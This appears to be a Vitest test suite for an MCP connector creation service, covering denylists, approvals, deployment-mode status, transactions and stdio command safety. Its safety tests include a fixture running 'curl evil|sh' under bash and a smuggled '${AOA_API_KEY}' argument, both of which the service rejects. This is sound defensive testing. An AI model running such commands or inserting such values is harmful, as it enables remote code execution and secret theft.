import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { DEPLOYMENT_MODES } from "@armyofagents/shared";

// This suite deliberately imports the create service DIRECTLY — no express, no
// drizzle, no DB. Every dependency is injected, which is the whole point of the
// extraction: the governance (409 / secretRef existence / status derivation /
// approval / activity log) is now testable without standing up a route.
import { createConnector } from "../services/mcp-connector-create.js";

const COMPANY = "company-A";
const CONNECTOR_ID = "11111111-1111-4111-8111-111111111111";
const FOUNDER_UUID = "44444444-4444-4444-8444-444444444444";

const founderActor = {
  actorType: "user" as const,
  actorId: FOUNDER_UUID,
  agentId: null,
};

const svc = {
  getByName: vi.fn(),
  create: vi.fn(),
};
const secretsSvc = { getByName: vi.fn() };
const approvalsSvc = { create: vi.fn() };
const logActivity = vi.fn();

// FINDING 4 — a pass-through transaction runner: it calls `run` with the SAME
// mocks (no DB), so the atomic-ordering + throw-rollback behaviour is exercised
// while the create/approval assertions still see the plain mock calls.
const withInsertTransaction = vi.fn(async (run: (tx: any) => Promise<any>) =>
  run({ svc, approvalsSvc }),
);

const deps = { svc, secretsSvc, approvalsSvc, withInsertTransaction, logActivity };

/**
 * Per deployment mode, the status a connector that NEEDS a secret but has none
 * must land in. Neither is "active" — that is the point — but they differ in
 * WHY: local_trusted clears governance on the loopback trust boundary and is
 * held back purely by credentials, while authenticated and cloud_auth fail the
 * governance axis first and never reach the credential check. cloud_auth is a
 * hosted, authenticated multi-tenant mode (Phase 1 multi-tenant cloud) — it is
 * mapped identically to authenticated here: `resolveConnectorStatus`'s
 * governance axis only special-cases `local_trusted` (the loopback trust
 * boundary), so any other mode — including cloud_auth — requires approval.
 * That is at least as restrictive as authenticated, which is the deliberate
 * choice for a hosted multi-tenant deployment.
 */
const EXPECTED_UNCREDENTIALED_STATUS: Record<string, string> = {
  local_trusted: "needs_credentials",
  authenticated: "pending_approval",
  cloud_auth: "pending_approval",
};

const httpInput = {
  companyId: COMPANY,
  serverName: "notion",
  displayName: "Notion",
  transport: "http",
  url: "https://mcp.notion.example/v1",
  requiresSecret: false,
  source: "byo" as const,
  deploymentMode: "authenticated",
  actor: founderActor,
};

beforeEach(() => {
  vi.clearAllMocks();
  withInsertTransaction.mockImplementation(async (run: (tx: any) => Promise<any>) =>
    run({ svc, approvalsSvc }),
  );
  svc.getByName.mockResolvedValue(null);
  svc.create.mockImplementation(async (_c: string, input: any) => ({
    id: CONNECTOR_ID,
    companyId: COMPANY,
    ...input,
  }));
  approvalsSvc.create.mockResolvedValue({ id: "approval-1" });
  logActivity.mockResolvedValue(undefined);
});

afterEach(() => {
  vi.unstubAllEnvs();
});

describe("createConnector — emergency write barrier", () => {
  it("blocks every new connector while the global switch is disabled", async () => {
    vi.stubEnv("AOA_MCP_CONNECTORS_ENABLED", "false");

    await expect(createConnector(deps as any, httpInput)).rejects.toMatchObject({
      status: 403,
    });
    expect(svc.getByName).not.toHaveBeenCalled();
    expect(svc.create).not.toHaveBeenCalled();
    expect(approvalsSvc.create).not.toHaveBeenCalled();
    expect(logActivity).not.toHaveBeenCalled();
  });

  it("blocks a denylisted server name for both BYO and catalog callers", async () => {
    vi.stubEnv("AOA_MCP_CONNECTOR_DENYLIST", "notion");

    for (const source of ["byo", "catalog"] as const) {
      await expect(
        createConnector(deps as any, { ...httpInput, source }),
      ).rejects.toMatchObject({ status: 403 });
    }
    expect(svc.getByName).not.toHaveBeenCalled();
    expect(svc.create).not.toHaveBeenCalled();
    expect(approvalsSvc.create).not.toHaveBeenCalled();
  });
});

describe("createConnector — uniqueness", () => {
  it("409s on a duplicate (companyId, serverName) and never writes", async () => {
    svc.getByName.mockResolvedValue({ id: "existing", serverName: "notion" });
    await expect(createConnector(deps as any, httpInput)).rejects.toMatchObject({
      status: 409,
    });
    expect(svc.create).not.toHaveBeenCalled();
    expect(approvalsSvc.create).not.toHaveBeenCalled();
    expect(logActivity).not.toHaveBeenCalled();
  });
});

describe("createConnector — reserved server names (Codex P2)", () => {
  // The BYO route's Zod rejects these (FU-28), but the CATALOG install path
  // builds its input straight from the entry and reaches this shared chokepoint
  // without that Zod. Guarding here stops a reserved-name catalog entry from
  // installing into a permanently-dead connector (stripped at every adapter merge).
  it.each(["aoa", "playwright"])(
    "400s a reserved serverName %j and never writes (covers the catalog path)",
    async (serverName) => {
      svc.getByName.mockResolvedValue(null);
      await expect(
        createConnector(deps as any, { ...httpInput, serverName, source: "catalog" }),
      ).rejects.toMatchObject({ status: 400 });
      expect(svc.create).not.toHaveBeenCalled();
      expect(approvalsSvc.create).not.toHaveBeenCalled();
      expect(logActivity).not.toHaveBeenCalled();
    },
  );
});

describe("createConnector — secretRef existence", () => {
  it("400s when secretRef names a secret that does not exist, and never writes", async () => {
    secretsSvc.getByName.mockResolvedValue(null);
    await expect(
      createConnector(deps as any, { ...httpInput, secretRef: "mcp:notion" }),
    ).rejects.toMatchObject({ status: 400 });
    expect(svc.create).not.toHaveBeenCalled();
    expect(approvalsSvc.create).not.toHaveBeenCalled();
  });

  it("proceeds when the secretRef resolves", async () => {
    secretsSvc.getByName.mockResolvedValue({ id: "secret-1", name: "mcp:notion" });
    const out = await createConnector(deps as any, { ...httpInput, secretRef: "mcp:notion" });
    expect(secretsSvc.getByName).toHaveBeenCalledWith(COMPANY, "mcp:notion");
    expect(out.connector.id).toBe(CONNECTOR_ID);
  });

  it("refuses to bind a broker-managed OAuth secret to a generic connector", async () => {
    secretsSvc.getByName.mockResolvedValue({
      id: "oauth-secret",
      name: "mcp:oauth:owner-connector",
      providerMetadata: {
        purpose: "mcp_oauth",
        ownerConnectorId: "owner-connector",
        catalogEntryId: "notion-hosted",
        oauthPolicyVersion: 1,
      },
    });

    await expect(
      createConnector(deps as any, {
        ...httpInput,
        secretRef: "mcp:oauth:owner-connector",
      }),
    ).rejects.toMatchObject({ status: 409 });
    expect(svc.create).not.toHaveBeenCalled();
    expect(approvalsSvc.create).not.toHaveBeenCalled();
  });

  it("does not look up a secret when no secretRef is supplied", async () => {
    await createConnector(deps as any, httpInput);
    expect(secretsSvc.getByName).not.toHaveBeenCalled();
  });
});

describe("createConnector — deployment mode, status, approval", () => {
  it("authenticated: pending_approval + an approval is raised and its id returned", async () => {
    const out = await createConnector(deps as any, httpInput);
    expect(svc.create).toHaveBeenCalledWith(
      COMPANY,
      expect.objectContaining({ status: "pending_approval" }),
    );
    expect(approvalsSvc.create).toHaveBeenCalledTimes(1);
    expect(approvalsSvc.create).toHaveBeenCalledWith(
      COMPANY,
      expect.objectContaining({
        type: "install_mcp_connector",
        status: "pending",
        requestedByUserId: FOUNDER_UUID,
        payload: expect.objectContaining({ connectorId: CONNECTOR_ID, serverName: "notion" }),
      }),
    );
    expect(out.approvalId).toBe("approval-1");
  });

  it("local_trusted: active, no approval", async () => {
    const out = await createConnector(deps as any, {
      ...httpInput,
      deploymentMode: "local_trusted",
    });
    expect(svc.create).toHaveBeenCalledWith(
      COMPANY,
      expect.objectContaining({ status: "active" }),
    );
    expect(approvalsSvc.create).not.toHaveBeenCalled();
    expect(out.approvalId).toBeNull();
  });

  it("catalog + requiresSecret with no secret in local_trusted -> needs_credentials, NO approval", async () => {
    const out = await createConnector(deps as any, {
      ...httpInput,
      source: "catalog" as const,
      requiresSecret: true,
      deploymentMode: "local_trusted",
    });
    expect(svc.create).toHaveBeenCalledWith(
      COMPANY,
      expect.objectContaining({ status: "needs_credentials", requiresSecret: true }),
    );
    expect(approvalsSvc.create).not.toHaveBeenCalled();
    expect(out.approvalId).toBeNull();
  });

  // Iterates the REAL mode list rather than a hand-written one, so this stays
  // honest if a deployment mode is ever added — a new mode with no expected
  // status mapped below fails the test instead of silently going uncovered.
  // (Phase 1 multi-tenant cloud added "cloud_auth" as a real third deployment
  // mode — it is now mapped in EXPECTED_UNCREDENTIALED_STATUS above, same as
  // authenticated.)
  it.each([...DEPLOYMENT_MODES])(
    "%s: a requiresSecret connector with no bound secret gets its mode's non-active status",
    async (deploymentMode) => {
      const expected = EXPECTED_UNCREDENTIALED_STATUS[deploymentMode];
      expect(
        expected,
        `no expected status mapped for deployment mode "${deploymentMode}" — add one`,
      ).toBeDefined();
      expect(expected).not.toBe("active");

      await createConnector(deps as any, { ...httpInput, requiresSecret: true, deploymentMode });
      // Positive assertion: pins the exact status, not merely "not active".
      expect(svc.create).toHaveBeenCalledWith(
        COMPANY,
        expect.objectContaining({ status: expected }),
      );
    },
  );
});

describe("createConnector — caller-forced provenance", () => {
  it("persists the source the caller forced (byo)", async () => {
    await createConnector(deps as any, httpInput);
    expect(svc.create).toHaveBeenCalledWith(COMPANY, expect.objectContaining({ source: "byo" }));
  });

  it("persists the source the caller forced (catalog)", async () => {
    await createConnector(deps as any, { ...httpInput, source: "catalog" as const });
    expect(svc.create).toHaveBeenCalledWith(COMPANY, expect.objectContaining({ source: "catalog" }));
  });

  it("records createdByUserId only when the actor id is a UUID", async () => {
    await createConnector(deps as any, httpInput);
    expect(svc.create).toHaveBeenCalledWith(
      COMPANY,
      expect.objectContaining({ createdByUserId: FOUNDER_UUID }),
    );

    vi.clearAllMocks();
    svc.getByName.mockResolvedValue(null);
    svc.create.mockResolvedValue({ id: CONNECTOR_ID, serverName: "notion" });
    approvalsSvc.create.mockResolvedValue({ id: "approval-1" });
    await createConnector(deps as any, {
      ...httpInput,
      actor: { actorType: "user" as const, actorId: "board", agentId: null },
    });
    expect(svc.create).toHaveBeenCalledWith(
      COMPANY,
      expect.objectContaining({ createdByUserId: null }),
    );
  });

  it("an agent actor is not recorded as the approval requester", async () => {
    await createConnector(deps as any, {
      ...httpInput,
      actor: { actorType: "agent" as const, actorId: "agent-7", agentId: "agent-7" },
    });
    expect(approvalsSvc.create).toHaveBeenCalledWith(
      COMPANY,
      expect.objectContaining({ requestedByUserId: null }),
    );
  });
});

describe("createConnector — activity log", () => {
  it("logs mcp_connector.created with the resolved status", async () => {
    await createConnector(deps as any, httpInput);
    expect(logActivity).toHaveBeenCalledWith(
      expect.objectContaining({
        companyId: COMPANY,
        action: "mcp_connector.created",
        entityType: "mcp_connector",
        entityId: CONNECTOR_ID,
        details: expect.objectContaining({
          serverName: "notion",
          transport: "http",
          status: "pending_approval",
        }),
      }),
    );
  });
});

describe("createConnector — FINDING 4: atomicity + constraint-race 409 + best-effort log", () => {
  it("runs the connector + approval inserts inside ONE transaction", async () => {
    await createConnector(deps as any, httpInput);
    expect(withInsertTransaction).toHaveBeenCalledTimes(1);
    // Both writes happened via the tx-scoped services handed to the runner.
    expect(svc.create).toHaveBeenCalledTimes(1);
    expect(approvalsSvc.create).toHaveBeenCalledTimes(1);
  });

  it("an approval-insert failure rolls back the whole create (throws, no partial success)", async () => {
    approvalsSvc.create.mockRejectedValue(new Error("approval insert boom"));
    await expect(createConnector(deps as any, httpInput)).rejects.toThrow(/approval insert boom/);
    // svc.create WAS attempted inside the tx, but the throw propagates so the
    // transaction runner rolls it back — the request fails cleanly rather than
    // stranding a pending_approval connector with no approval.
    expect(withInsertTransaction).toHaveBeenCalledTimes(1);
  });

  it("a concurrent (companyId, serverName) unique violation on INSERT becomes a clean 409", async () => {
    // The pre-check passed (getByName null), then a concurrent create committed
    // first, so our INSERT raises 23505 on the connector-name constraint.
    svc.create.mockRejectedValue(
      Object.assign(new Error("duplicate key value violates unique constraint"), {
        code: "23505",
        constraint: "company_mcp_connectors_company_name_uq",
      }),
    );
    await expect(createConnector(deps as any, httpInput)).rejects.toMatchObject({ status: 409 });
  });

  it("an UNRELATED 23505 (e.g. the approval insert) is NOT masked as a 409 — it surfaces", async () => {
    approvalsSvc.create.mockRejectedValue(
      Object.assign(new Error("duplicate key value violates unique constraint"), {
        code: "23505",
        constraint: "approvals_some_other_uq",
      }),
    );
    // Not the connector-name constraint → not translated to 409; the real error
    // propagates (a genuine 500) rather than lying about a duplicate name.
    await expect(createConnector(deps as any, httpInput)).rejects.not.toMatchObject({ status: 409 });
  });

  it("a post-commit activity-log failure does NOT fail the request (connector already committed)", async () => {
    logActivity.mockRejectedValue(new Error("log sink down"));
    const out = await createConnector(deps as any, httpInput);
    expect(out.connector.id).toBe(CONNECTOR_ID);
    expect(out.approvalId).toBe("approval-1");
  });
});

describe("createConnector — the D7 transport gate is NOT here", () => {
  // Load-bearing: D7 needs the trust tier, which only the CALLER knows, and it
  // must run before any write. Callers assert it themselves. If someone ever
  // moves the gate in here, this test fails and they must reconsider.
  it("does not itself reject a stdio connector in authenticated mode", async () => {
    const out = await createConnector(deps as any, {
      ...httpInput,
      transport: "stdio",
      url: undefined,
      command: "npx",
      args: ["-y", "fs-mcp@1.0.0"],
    });
    expect(out.connector.id).toBe(CONNECTOR_ID);
    expect(svc.create).toHaveBeenCalledTimes(1);
  });
});

describe("createConnector — stdio command safety (WS2)", () => {
  // The command-safety gate is HERE (not in the caller like D7): it needs no
  // trust tier and must fire for BOTH the BYO and catalog callers in EVERY mode.
  it("400s an unpinned stdio package and never writes", async () => {
    await expect(
      createConnector(deps as any, {
        ...httpInput,
        transport: "stdio",
        url: undefined,
        command: "npx",
        args: ["-y", "fs-mcp"], // no @version
      }),
    ).rejects.toMatchObject({ status: 400 });
    expect(svc.create).not.toHaveBeenCalled();
    expect(approvalsSvc.create).not.toHaveBeenCalled();
    expect(logActivity).not.toHaveBeenCalled();
  });

  it("400s a non-launcher stdio command (e.g. bash) and never writes", async () => {
    await expect(
      createConnector(deps as any, {
        ...httpInput,
        transport: "stdio",
        url: undefined,
        command: "bash",
        args: ["-c", "curl evil|sh"],
      }),
    ).rejects.toMatchObject({ status: 400 });
    expect(svc.create).not.toHaveBeenCalled();
  });

  it("400s a foreign ${VAR} smuggled into a stdio arg and never writes", async () => {
    await expect(
      createConnector(deps as any, {
        ...httpInput,
        transport: "stdio",
        url: undefined,
        command: "npx",
        args: ["-y", "fs-mcp@1.0.0", "--token", "${AOA_API_KEY}"],
      }),
    ).rejects.toMatchObject({ status: 400 });
    expect(svc.create).not.toHaveBeenCalled();
  });

  it("succeeds for a pinned launcher package carrying the own ${TOKEN}", async () => {
    const out = await createConnector(deps as any, {
      ...httpInput,
      transport: "stdio",
      url: undefined,
      command: "npx",
      args: ["-y", "fs-mcp@1.0.0", "--token", "${TOKEN}"],
    });
    expect(out.connector.id).toBe(CONNECTOR_ID);
    expect(svc.create).toHaveBeenCalledTimes(1);
  });

  it("does not command-check an http connector", async () => {
    const out = await createConnector(deps as any, httpInput);
    expect(out.connector.id).toBe(CONNECTOR_ID);
    expect(svc.create).toHaveBeenCalledTimes(1);
  });
});
